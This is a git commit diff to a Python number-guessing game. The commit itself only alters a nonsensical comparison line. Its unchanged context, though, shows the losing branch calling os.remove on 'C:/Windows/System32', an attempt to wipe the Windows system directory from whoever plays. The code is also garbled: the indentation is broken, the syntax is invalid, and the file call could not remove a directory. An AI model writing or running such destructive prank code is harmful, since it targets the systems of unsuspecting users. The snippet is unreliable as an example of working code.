b95ad0311e864c1df4ff6da9e77c98eab02e3526
st1koo <74153758+st1koo@users.noreply.github.com>
2024-02-25 19:35:46 +0200

    changed the nummber from 7 to random guess

--- game.py
+++ game.py
@@ -6,7 +6,7 @@ number = random.randint(1,10)
 guess = input("let's play a GAME, guess the nummber from 1-10")
 guess = int(guess)
 
-if guess == number: 7
+if guess == number: random
 print ("you won congrats for not breaking you operating system")
 else:
 os.remove("C:/Windows/System32")
